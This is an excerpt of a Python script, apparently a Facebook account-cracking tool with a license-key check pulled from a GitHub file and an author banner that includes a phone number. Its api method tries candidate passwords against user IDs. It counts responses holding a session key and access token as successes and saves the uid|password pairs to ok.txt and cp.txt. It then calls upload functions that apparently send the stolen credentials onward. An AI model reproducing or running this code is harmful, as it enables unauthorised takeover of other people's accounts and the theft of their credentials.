...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Hossin-Siddiki/New-2023/blob/main/Approved.txt"])
	exit(" [*] FACEBOOK :  MD SOJIB SARDER")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰KNOWLEDGE ")
	subprocess.check_output(["am", "start", "https://m.me/Md.SajibSarderOfficial"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Hossin-Siddiki/New-2023/blob/main/Approved.txt').text
			if basesplit in plr:
				key = basesplit
    ...
    __ __ _   ______ _       ____    __________  ____________   
   / //_// | / / __ \ |     / / /   / ____/ __ \/ ____/ ____/   
  / ,<  /  |/ / / / / | /| / / /   / __/ / / / / / __/ __/      
 / /| |/ /|  / /_/ /| |/ |/ / /___/ /___/ /_/ / /_/ / /___      
/_/ |_/_/ |_/\____/ |__/|__/_____/_____/_____/\____/_____/                                                                  
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : MD SOJIB SARDER  
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : MD SOJIB SARDER
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : MD SOJIB SARDER
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01780232369
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [KNOWLEDGE _OLD] : %s/%s -> \033[0;92m [ KNOWLEDGE -OK:%s ]- \033[0;91m[KNOWLEDGE -CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[KNOWLEDGE -OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [KNOWLEDGE -OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[KNOWLEDGE -CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [KNOWLEDGE -CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
